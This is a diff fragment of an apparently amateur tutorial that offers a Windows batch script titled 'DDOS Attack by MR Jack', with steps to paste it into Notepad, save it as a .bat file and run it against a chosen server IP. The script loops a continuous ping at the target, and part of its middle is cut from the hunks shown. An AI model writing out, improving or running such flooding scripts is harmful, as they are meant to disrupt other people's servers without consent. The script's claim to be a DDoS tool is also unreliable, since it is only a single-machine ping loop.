@@ -1,6 +1,4 @@
-
 1) copy paste the following code in to youre notepad
-
 @echo off
 mode 67,16
 title DDOS Attack by MR Jack
@@ -31,7 +29,6 @@ color 0c
 echo Attacking Server %m%
 ping %m% -i %n% -t >nul
 goto DDOS
-
 2) its a batch file so save it as whateveruwant.bat
 3) run it and select the server target, the ip and how many packets you want to send to the server and then press enter
 
